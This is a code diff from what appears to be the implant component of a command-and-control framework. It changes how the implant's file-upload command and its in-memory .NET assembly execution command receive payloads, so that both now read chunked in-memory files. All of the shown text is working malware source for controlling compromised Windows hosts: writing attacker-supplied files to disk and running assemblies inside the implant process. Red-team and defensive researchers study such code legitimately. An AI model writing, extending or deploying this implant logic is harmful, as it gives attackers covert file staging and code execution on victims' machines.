@@ -845,13 +845,35 @@ VOID CommandFS( PPARSER Parser )
 
         case DEMON_COMMAND_FS_UPLOAD: PUTS( "FS::Upload" )
         {
-            DWORD  FileSize = 0;
-            DWORD  NameSize = 0;
-            DWORD  Written  = 0;
-            HANDLE hFile    = NULL;
-            LPWSTR FileName = ParserGetBytes( Parser, &NameSize );
-            PVOID  Content  = ParserGetBytes( Parser, &FileSize );
-            BOOL   Success  = TRUE;
+            DWORD     FileSize  = 0;
+            DWORD     NameSize  = 0;
+            DWORD     Written   = 0;
+            HANDLE    hFile     = NULL;
+            LPWSTR    FileName  = ParserGetBytes( Parser, &NameSize );
+            ULONG     MemFileID = ParserGetInt32( Parser );
+            PMEM_FILE MemFile   = GetMemFile( MemFileID );
+            BOOL      Success   = TRUE;
+            PVOID     Content   = NULL;
+
+            // TODO: handle error and communicate to the TS
+
+            if ( MemFile && MemFile->IsCompleted )
+            {
+                Content  = MemFile->Data;
+                FileSize = MemFile->Size;
+            }
+            else if ( MemFile && ! MemFile->IsCompleted )
+            {
+                PRINTF( "MemFile [%x] was not completed\n", MemFileID );
+                Success = FALSE;
+                goto CleanupUpload;
+            }
+            else
+            {
+                PRINTF( "MemFile [%x] not found\n", MemFileID );
+                Success = FALSE;
+                goto CleanupUpload;
+            }
 
             PRINTF( "FileName[%d] => %ls\n", FileSize, FileName )
 
@@ -1598,8 +1620,25 @@ VOID CommandAssemblyInlineExecute( PPARSER Parser )
         Instance.Dotnet->NetVersion.Length = Buffer.Length;
         MemCopy( Instance.Dotnet->NetVersion.Buffer, Buffer.Buffer, Instance.Dotnet->NetVersion.Length );
 
-        /* Parse Assembly */
-        AssemblyData.Buffer = ParserGetBytes( Parser, &AssemblyData.Length );
+        /* Parse Assembly MemFile */
+        ULONG32 MemFileID = ParserGetInt32( Parser );
+        PMEM_FILE MemFile = GetMemFile( MemFileID );
+        AssemblyData.Buffer = NULL;
+        AssemblyData.Length = 0;
+
+        if ( MemFile && MemFile->IsCompleted )
+        {
+            AssemblyData.Buffer = MemFile->Data;
+            AssemblyData.Length = MemFile->Size;
+        }
+        else if ( MemFile && ! MemFile->IsCompleted )
+        {
+            PRINTF( "MemFile [%x] was not completed\n", MemFileID );
+        }
+        else
+        {
+            PRINTF( "MemFile [%x] not found\n", MemFileID );
+        }
 
         /* Parse Argument */
         AssemblyArgs.Buffer = ParserGetBytes( Parser, &Buffer.Length );
